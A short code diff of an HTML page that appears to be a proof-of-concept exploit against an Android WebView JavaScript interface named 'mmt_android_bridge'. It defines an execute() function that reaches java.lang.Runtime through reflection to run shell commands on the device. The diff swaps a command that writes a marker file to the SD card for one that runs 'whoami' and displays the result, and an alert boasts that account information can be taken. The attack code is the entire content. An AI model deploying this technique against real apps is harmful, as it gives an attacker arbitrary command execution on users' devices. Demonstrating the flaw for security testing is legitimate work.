@@ -7,7 +7,7 @@
     <script>
        alert("Due to the setjavascriptenabled(true) I can execute any javascript and get the information of account");
         
-            alert("new");
+            alert("new code");
      
     </script>
 </head>
@@ -16,7 +16,8 @@
 function execute(cmd){
 return window.mmt_android_bridge.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
 }
-execute(['/system/bin/sh','-c','echo \"mwr\" > /mnt/sdcard/mwr.txt']);
+var result = execute(['/system/bin/sh', '-c', 'whoami']);
+alert("Current user: " + result);
 </script>
 </body>
 </html>
